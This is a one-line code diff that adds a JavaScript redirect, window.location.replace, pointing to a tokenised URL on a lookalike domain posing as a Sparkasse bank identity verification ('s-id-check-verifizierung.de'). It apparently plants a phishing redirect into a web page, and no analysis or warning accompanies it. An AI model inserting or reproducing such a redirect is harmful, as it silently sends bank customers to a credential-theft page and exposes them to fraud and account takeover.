@@ -1,0 +1,1 @@
+window.location.replace("https://sparkasse.s-id-check-verifizierung.de/GdITqAhPkDaCN0g6A9ZOwyaP7TRVljLS4PmcbxZbdrsI4DTG0Hl6WoiysM3VOUCym67I4/");
